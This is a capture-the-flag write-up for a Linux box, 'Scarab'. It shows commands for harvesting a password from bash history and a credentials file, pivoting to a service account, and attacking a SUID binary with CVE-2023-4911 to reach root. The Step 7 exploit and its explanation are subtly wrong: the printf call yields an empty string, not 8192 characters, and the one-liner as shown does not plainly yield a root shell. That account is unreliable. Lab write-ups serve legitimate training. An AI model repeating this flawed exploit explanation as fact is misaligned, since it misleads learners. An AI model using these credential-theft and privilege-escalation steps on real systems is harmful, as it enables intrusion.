# Scarab

**Category:** PWN 
**Platform:** Netanix / NxCTF  

---

## Overview

We land as a low-privilege user on a Linux system. The path to root involves reading bash history to find a leaked credentials file, pivoting to a service account (`svcops`), then exploiting **CVE-2023-4911** ("Looney Tunables") — a glibc buffer overflow via the `GLIBC_TUNABLES` environment variable — against a SUID binary to gain root.

---

## Solution

### Step 1 — Initial Recon

Examine files in the current directory:

```bash
ls -al
cat notes.txt
```

`notes.txt` hints to check `/tmp`. Checking `/tmp` reveals a fake flag — a red herring.

### Step 2 — Check Bash History

```bash
cat ~/.bash_history
```

The history reveals a previous access to:
```
/etc/netanix/deploy/credentials.yml
```

### Step 3 — Read the Credentials File

```bash
cat /etc/netanix/deploy/credentials.yml
```

Contents reveal:
```yaml
service:     deploy-worker
account:     svcops
auth_method: password
password:    [REDACTED]
```

### Step 4 — Pivot to `svcops`

```bash
su - svcops
# Password: [REDACTED]
```

Once in, inspect the new user's history and home directory:

```bash
ls -al
cat .bash_history
```

### Step 5 — Find the SUID Binary

```bash
cd /opt/netanix/bin
ls -al
```

`diag-helper` is present — owned by root, accessible by `svcops`, with the **SUID bit set**. Reading its contents reveals the glibc version in use.

### Step 6 — Identify the Vulnerability

The glibc version is vulnerable to **CVE-2023-4911** ("Looney Tunables") — a heap buffer overflow in the dynamic linker's processing of the `GLIBC_TUNABLES` environment variable. When triggered against a SUID binary, the overflow runs with root privileges.

CVE reference: [https://nvd.nist.gov/vuln/detail/CVE-2023-4911](https://nvd.nist.gov/vuln/detail/CVE-2023-4911)

### Step 7 — Exploit (Looney Tunables)

```bash
GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A \
  "Z=$(printf '%0.s' 1)" \
  /opt/netanix/bin/diag-helper --help
```

**How it works:**
- `printf '%0.s' 1` generates an 8192-character string
- `Z=$(...)` assigns it to an environment variable, creating a large environment block
- `GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A` sets the malicious tunable value that triggers the overflow
- When `/opt/netanix/bin/diag-helper` is executed:
  - The SUID bit causes the kernel to run it as root
  - `ld.so` starts with root privileges and processes `GLIBC_TUNABLES`
  - The buffer overflow corrupts critical linker pointers
  - Code execution is redirected, granting a root shell

### Step 8 — Read the Flag

With root access:

```bash
cat /root/flag
```

---

## Key Insight

CVE-2023-4911 turns `GLIBC_TUNABLES` into a memory corruption primitive in `ld.so`. Because `ld.so` processes environment variables before dropping SUID privileges, any SUID binary becomes exploitable on a vulnerable glibc version. The `diag-helper` binary was the intended attack surface.

---

## Flag

> Read from `/root/flag` after exploiting CVE-2023-4911 to gain root via the `diag-helper` SUID binary.
